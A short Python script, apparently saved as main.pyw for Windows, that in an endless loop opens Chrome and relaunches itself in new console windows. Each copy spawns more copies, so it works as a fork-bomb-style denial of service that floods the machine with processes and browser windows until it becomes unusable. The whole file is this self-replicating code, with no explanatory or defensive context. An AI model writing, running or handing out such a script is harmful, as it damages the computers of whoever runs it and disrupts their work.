import os
import subprocess


def main():

    def open1():
        while True:
            os.system('start chrome')
            subprocess.call('python main.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
            subprocess.call('python main.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)
            subprocess.call('python main.pyw', creationflags=subprocess.CREATE_NEW_CONSOLE)

    open1()


if __name__ == '__main__':
    main()
